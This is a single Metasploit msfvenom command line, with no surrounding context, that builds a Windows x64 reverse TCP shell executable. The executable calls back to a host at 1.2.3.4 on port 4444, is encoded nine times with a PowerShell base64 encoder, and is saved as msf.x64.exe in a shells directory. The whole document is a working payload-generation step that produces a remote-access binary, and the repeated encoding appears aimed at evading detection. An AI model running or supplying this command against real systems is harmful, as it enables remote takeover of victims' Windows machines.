/usr/share/metasploit-framework/msfvenom -p windows/x64/shell/reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f exe -e cmd/powershell_base64 -i 9 > /config/shells/msf.x64.exe
